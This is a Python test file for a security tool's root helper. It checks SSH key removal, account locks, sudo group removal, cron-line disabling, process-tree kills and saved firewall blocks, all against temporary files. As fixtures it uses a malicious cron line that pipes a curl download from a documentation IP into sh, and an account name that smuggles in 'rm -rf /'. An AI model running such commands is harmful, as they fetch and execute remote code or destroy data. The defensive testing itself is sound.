# tests/test_containment_verbs.py
# The root helper's containment verbs, run unelevated against temporary
# files: SSH keys, account locks, privileged groups, cron lines, process trees
# and saved blocks. usermod and gpasswd are stood in for by a fake runner that
# edits the temporary shadow and group files, because the real ones need root.

import json
import os
import pathlib
import pwd
import shutil
import subprocess
import sys
import tempfile
import time

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from tools import action_helper as ah                 # noqa: E402

fails = []


def check(label, got, want):
    ok = got == want
    print(f"  {'PASS' if ok else 'FAIL'}  {label}: {got!r}" + ("" if ok else f"  (want {want!r})"))
    if not ok:
        fails.append(label)


def refused(reply):
    return (not reply["ok"]) and bool(reply.get("refused"))


tmp = pathlib.Path(tempfile.mkdtemp())
ah.LOG_DIR = str(tmp / "log")
ah.LOG_PATH = str(tmp / "log" / "action_helper.log")
ah.UNDO_DIR = str(tmp / "undo")
ah.BLOCKS_STATE = str(tmp / "blocks.json")
ME = pwd.getpwuid(os.getuid()).pw_name
_NAMES = {p.pw_name for p in pwd.getpwall()}
OTHER = next(n for n in ("daemon", "bin", "sys", "nobody") if n in _NAMES)
os.environ["PKEXEC_UID"] = str(os.getuid())


print("\n[1] the verb table names every new verb")
for verb in ("kill_tree", "enable_unit", "remove_ssh_key", "restore_ssh_key",
             "lock_account", "unlock_account", "remove_group_member",
             "restore_group_member", "disable_cron_line", "restore_cron_line",
             "restore_blocks"):
    check(f"{verb} is a verb with a handler", verb in ah.VERBS and verb in ah.HANDLERS, True)


print("\n[2] SSH keys, by fingerprint")
keys = tmp / "ssh"
keys.mkdir()
for name in ("a", "b"):
    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C",
                    f"key-{name}", "-f", str(keys / name)], check=True)
pub_a = (keys / "a.pub").read_text().strip()
pub_b = (keys / "b.pub").read_text().strip()
fp_a = subprocess.run(["ssh-keygen", "-lf", str(keys / "a.pub")],
                      capture_output=True, text=True).stdout.split()[1]
check("the fingerprint matches ssh-keygen's", ah._key_fingerprint(pub_a), fp_a)
check("and is found behind options",
      ah._key_fingerprint('from="192.0.2.1",no-pty ' + pub_a), fp_a)
check("a comment line has none", ah._key_fingerprint("# " + pub_a), None)

auth = keys / "authorized_keys"
auth.write_text(f"{pub_b}\n# a note\ncommand=\"/bin/true\" {pub_a}\n")
auth.chmod(0o600)
ah._key_files = lambda pw: [str(auth), str(keys / "authorized_keys2")]

check("a fingerprint in the wrong shape is refused",
      refused(ah.handle("remove_ssh_key", [ME, "MD5:00"])), True)
check("an unknown account is refused",
      refused(ah.handle("remove_ssh_key", ["no-such-user-x", fp_a])), True)
out = ah.handle("remove_ssh_key", [ME, fp_a])
res = out.get("result") or {}
check("the key is removed", (out["ok"], res.get("removed")), (True, True))
check("only that line went", auth.read_text(), f"{pub_b}\n# a note\n")
check("the mode is kept", oct(auth.stat().st_mode & 0o777), "0o600")
check("an undo record was kept", (pathlib.Path(ah.UNDO_DIR) / (res.get("undo_id", "x") + ".json")).exists(), True)
again = ah.handle("remove_ssh_key", [ME, fp_a])
check("removing it again changes nothing", again["result"]["removed"], False)
back = ah.handle("restore_ssh_key", [res["undo_id"]])
check("restore puts the line back", fp_a in [ah._key_fingerprint(l) for l in auth.read_text().splitlines()], True)
check("and spends the record", refused(ah.handle("restore_ssh_key", [res["undo_id"]])), True)
check("a malformed undo id is refused", refused(ah.handle("restore_ssh_key", ["../../etc/x"])), True)


print("\n[3] account locks")
shadow = tmp / "shadow"
group = tmp / "group"
ah.SHADOW_PATH = str(shadow)
ah.GROUP_PATH = str(group)
shadow.write_text(f"root:$6$x:19000:0:99999:7:::\n{OTHER}:$6$hash:19000:0:99999:7:::\n"
                  f"{ME}:$6$mine:19000:0:99999:7:::\n")
real_run = ah._run
ran = []


def fake_run(argv, timeout=30):
    ran.append(argv)
    if argv[0] == "usermod":
        user = argv[-1]
        rows = [l.split(":") for l in shadow.read_text().splitlines()]
        for r in rows:
            if r[0] != user:
                continue
            opts = argv[1:-1]
            if "-L" in opts and not r[1].startswith("!"):
                r[1] = "!" + r[1]
            if "-U" in opts and r[1].startswith("!"):
                r[1] = r[1][1:]
            if "-e" in opts:
                r[7] = opts[opts.index("-e") + 1]
        shadow.write_text("".join(":".join(r) + "\n" for r in rows))
        return 0, "", ""
    if argv[0] == "gpasswd":
        flag, user, grp = argv[1], argv[2], argv[3]
        rows = [l.split(":") for l in group.read_text().splitlines()]
        for r in rows:
            if r[0] == grp:
                members = [m for m in r[3].split(",") if m]
                if flag == "-d":
                    members = [m for m in members if m != user]
                elif user not in members:
                    members.append(user)
                r[3] = ",".join(members)
        group.write_text("".join(":".join(r) + "\n" for r in rows))
        return 0, "", ""
    return real_run(argv, timeout)


ah._run = fake_run
check("root is refused", refused(ah.handle("lock_account", ["root"])), True)
check("the approving account is refused", refused(ah.handle("lock_account", [ME])), True)
check("a name with shell characters is refused",
      refused(ah.handle("lock_account", ["x;rm -rf /"])), True)
out = ah.handle("lock_account", [OTHER])
res = out.get("result") or {}
check("another account is locked and expired",
      (out["ok"], ah._shadow_fields(OTHER)), (True, {"locked": True, "expire": "1"}))
back = ah.handle("unlock_account", [res.get("undo_id", "")])
check("unlock puts it back as it was",
      (back["ok"], ah._shadow_fields(OTHER)), (True, {"locked": False, "expire": ""}))
check("the record is spent", refused(ah.handle("unlock_account", [res.get("undo_id", "")])), True)
shadow.write_text(shadow.read_text().replace(f"{OTHER}:$6$hash", f"{OTHER}:!$6$hash"))
res = ah.handle("lock_account", [OTHER])["result"]
ah.handle("unlock_account", [res["undo_id"]])
check("an account locked before stays locked after the undo",
      ah._shadow_fields(OTHER)["locked"], True)


print("\n[4] privileged groups")
group.write_text(f"sudo:x:27:{ME},{OTHER}\nusers:x:100:{OTHER}\ndocker:x:998:\n")
check("a group outside the list is refused",
      refused(ah.handle("remove_group_member", [OTHER, "users"])), True)
check("the approving account is refused",
      refused(ah.handle("remove_group_member", [ME, "sudo"])), True)
out = ah.handle("remove_group_member", [OTHER, "sudo"])
res = out.get("result") or {}
check("another account leaves sudo", (out["ok"], ah._group_members("sudo")[1]), (True, [ME]))
check("not a member changes nothing",
      ah.handle("remove_group_member", [OTHER, "docker"])["result"]["removed"], False)
back = ah.handle("restore_group_member", [res.get("undo_id", "")])
check("restore puts the membership back", OTHER in ah._group_members("sudo")[1], True)


print("\n[5] cron lines")
cron_d = tmp / "cron.d"
spool = tmp / "crontabs"
cron_d.mkdir()
spool.mkdir()
etc_crontab = tmp / "crontab"
ah.CRON_FILES = (str(etc_crontab),)
ah.CRON_DIRS = (str(cron_d), str(spool))
ah.USER_SPOOL = str(spool)
bad = "*/5 * * * * root curl -s http://198.51.100.7/x | sh"
job = cron_d / "updater"
job.write_text(f"SHELL=/bin/sh\n{bad}\n0 3 * * * root /usr/bin/true\n")
check("a file cron does not read is refused",
      refused(ah.handle("disable_cron_line", [str(tmp / "elsewhere"), bad])), True)
check("a path with .. is refused",
      refused(ah.handle("disable_cron_line", [str(cron_d) + "/../crontab", bad])), True)
check("a comment line is refused",
      refused(ah.handle("disable_cron_line", [str(job), "# " + bad])), True)
out = ah.handle("disable_cron_line", [str(job), bad])
res = out.get("result") or {}
check("the line is disabled", (out["ok"], res.get("disabled")), (True, True))
lines = job.read_text().splitlines()
check("it is kept as a comment", lines[1].startswith("# disabled by AgentalSec ") and lines[1].endswith(bad), True)
check("the other lines are untouched", (lines[0], lines[2]), ("SHELL=/bin/sh", "0 3 * * * root /usr/bin/true"))
check("a line not in the file changes nothing",
      ah.handle("disable_cron_line", [str(job), "1 1 * * * root x"])["result"]["disabled"], False)
ah.handle("restore_cron_line", [res.get("undo_id", "")])
check("restore makes it active again", job.read_text().splitlines()[1], bad)
link = cron_d / "link"
link.symlink_to(job)
check("a symlink is refused", refused(ah.handle("disable_cron_line", [str(link), bad])), True)


print("\n[6] a process tree")
ah._run = real_run
p = subprocess.Popen(["bash", "-c", "bash -c 'sleep 300 & wait' & sleep 300 & wait"])
time.sleep(0.8)
comm, _, ticks = ah._stat_fields(p.pid)
tree = [p.pid] + [c[0] for c in ah._children_map().get(p.pid, [])]
grand = [g[0] for c in tree[1:] for g in ah._children_map().get(c, [])]
check("the test tree has children and a grandchild", (len(tree) >= 3, len(grand) >= 1), (True, True))
check("a wrong start tick is refused",
      refused(ah.handle("kill_tree", [str(p.pid), comm, str(ticks + 1)])), True)
out = ah.handle("kill_tree", [str(p.pid), comm, str(ticks)])
p.wait(timeout=10)


def running(pid):
    # A killed child waits as a zombie until init reaps it; that is gone.
    try:
        with open(f"/proc/{pid}/stat") as fh:
            return fh.read().rpartition(")")[2].split()[0] != "Z"
    except OSError:
        return False


for _ in range(30):
    alive = [x for x in tree + grand if running(x)]
    if not alive:
        break
    time.sleep(0.1)
check("every process in the tree is gone", (out["ok"], out["result"]["gone"], alive), (True, True, []))
check("it reports each one", len(out["result"]["killed"]) >= len(tree) + len(grand), True)
check("pid 1 is refused", refused(ah.handle("kill_tree", ["1", "systemd", "1"])), True)


print("\n[7] saved blocks come back")
if shutil.which("unshare") and shutil.which("nft"):
    script = f"""
import json, sys
sys.path.insert(0, {str(ROOT)!r})
from tools import action_helper as ah
ah.LOG_DIR = {str(tmp / 'nslog')!r}; ah.LOG_PATH = ah.LOG_DIR + '/l'
ah.BLOCKS_STATE = {str(tmp / 'ns_blocks.json')!r}
ah._boot_restore_installed = lambda: False
out = {{}}
out['block'] = ah.handle('block_ip', ['203.0.113.9'])
out['saved'] = json.load(open(ah.BLOCKS_STATE))
ah._run(['nft', 'delete', 'table', 'inet', ah.NFT_TABLE])
out['after_flush'] = ah.handle('list_blocks', [])
out['restore'] = ah.handle('restore_blocks', [])
out['list'] = ah.handle('list_blocks', [])
print(json.dumps(out))
"""
    res = subprocess.run(["unshare", "-rn", sys.executable, "-c", script],
                         capture_output=True, text=True, timeout=60)
    try:
        o = json.loads(res.stdout.strip().splitlines()[-1])
    except (ValueError, IndexError):
        o = {}
        print(res.stderr[-800:])
    check("a block is saved", (o.get("saved") or {}).get("blocked"), ["203.0.113.9"])
    check("and says how long it lasts without the boot unit",
          ((o.get("block") or {}).get("result") or {}).get("persists", "").startswith("until reboot, because"), True)
    check("the table is gone after the flush", (o.get("after_flush") or {}).get("result", {}).get("table"), False)
    check("restore_blocks puts it back",
          ((o.get("restore") or {}).get("result") or {}).get("restored"), ["203.0.113.9"])
    check("read back", ((o.get("list") or {}).get("result") or {}).get("blocked"), ["203.0.113.9"])
else:
    print("  SKIP  unshare or nft is not available")

shutil.rmtree(tmp, ignore_errors=True)
print()
print("ALL CHECKS PASSED" if not fails else f"FAILED: {fails}")
sys.exit(1 if fails else 0)
